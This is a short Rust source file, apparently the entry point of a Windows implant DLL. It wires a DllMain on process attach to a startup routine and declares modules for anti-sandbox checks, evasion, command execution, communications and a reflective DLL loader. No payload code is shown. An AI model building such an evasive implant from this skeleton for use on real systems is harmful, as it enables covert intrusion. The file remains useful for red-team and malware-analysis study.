#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use windows_sys::Win32::{
    Foundation::{HINSTANCE, TRUE},
    System::SystemServices::DLL_PROCESS_ATTACH,
};

use crate::utils::{
    allocate::ProcessHeapAlloc,
    export_comptime::{StartType, internal_dll_start},
};

mod anti_sandbox;
mod comms;
mod entry;
mod evasion;
mod execute;
mod native;
mod rdi_loader;
mod utils;
mod wyrm;

#[global_allocator]
static GLOBAL_ALLOC: ProcessHeapAlloc = ProcessHeapAlloc;

#[unsafe(no_mangle)]
#[allow(non_snake_case)]
unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: usize) -> i32 {
    match dw_reason {
        DLL_PROCESS_ATTACH => internal_dll_start(StartType::DllMain),
        _ => (),
    }

    TRUE
}
